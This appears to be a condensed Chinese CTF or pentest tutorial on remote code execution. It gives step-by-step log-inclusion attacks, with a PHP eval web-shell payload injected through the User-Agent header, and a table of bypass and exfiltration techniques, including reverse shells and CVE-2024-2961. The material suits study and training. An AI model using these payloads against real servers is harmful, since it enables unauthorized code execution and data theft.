RCE（Remote Code Execution，远程代码执行）是能让攻击者直接在服务器上执行命令的高危漏洞。本文整理几类实战高频手法：Ping 的 DNS 外带、无回显命令执行、无字母/无参绕过、取反异或，以及 php://filter 提升为 RCE 的 CVE。

七、日志包含与 UA 注入（RCE 视角）

当伪协议和 include() 组合被禁用时，可走日志包含拿 RCE：

  1. 输入 /etc/passwd 看是否回显（确认可读文件）。
  2. 包含 /var/log/nginx/access.log，发现可行。
  3. 抓包，把 UA 改成 <?php phpinfo(); eval($_POST[1]);?>。
  4. 再包含日志，解析执行，命令执行即可。

这部分与文件包含篇互为补充：一个讲”怎么让代码执行”，一个讲”怎么把带代码的文件放进去”。

附：Kali 重启黑屏处理

环境小坑记录：Kali 重启黑屏，大概率是根分区 /dev/nvme0n1p2 使用率 100%。

小结

场景 手法
无回显、能外联 DNS 外带 / 反弹 shell / curl 外带
过滤字母数字 取反、异或
只允许无参函数 内置函数链 + get_defined_vars()
filter 可读文件 iconv 溢出提升 RCE（CVE-2024-2961）
include 可用 日志包含 + UA 注入

RCE 的本质是”找到执行点 + 绕过过滤 + 解决回显“三件事，不同题目只是这三步的组合变化。
